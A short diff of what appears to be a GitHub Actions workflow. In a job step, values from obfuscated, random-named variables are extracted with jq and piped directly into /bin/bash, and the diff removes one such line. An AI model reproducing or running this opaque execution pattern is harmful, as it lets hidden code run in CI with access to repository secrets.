@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$kn8769" | jq -r .pln8631 | /bin/bash
           echo $g29 | jq -r .zgpde7 | /bin/bash
           echo $tf9 | jq -r .hqy52735 | /bin/bash
-          printf '%s' "$uzstq8" | jq -r .slhl6825 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
